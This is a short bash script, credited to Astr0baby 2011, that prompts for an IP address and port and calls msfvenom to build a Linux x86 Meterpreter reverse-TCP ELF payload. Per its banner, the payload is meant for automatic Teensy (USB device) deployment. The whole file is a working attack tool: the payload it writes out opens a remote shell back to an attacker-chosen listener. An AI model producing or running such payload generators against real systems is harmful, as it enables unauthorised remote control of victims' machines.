clear  
echo "************************************************************"
echo "    Automatic  shellcode generator - FOR METASPLOIT         "
echo "                  By Astr0baby 2011                         "
echo "    For Automatic Teensy programming and deployment         "
echo "************************************************************"
echo -e "What IP are we gonna use ?  \c"
read IP 
echo -e "What Port Number are we gonna listen to? : \c"
read port
./msfvenom  -p  linux/x86/meterpreter/reverse_tcp  LHOST=$IP LPORT=$port EXITFUNC=thread R -f elf  > linux.elf 
chmod +x linux.elf;ls -la linux.elf  
echo "Done..." 
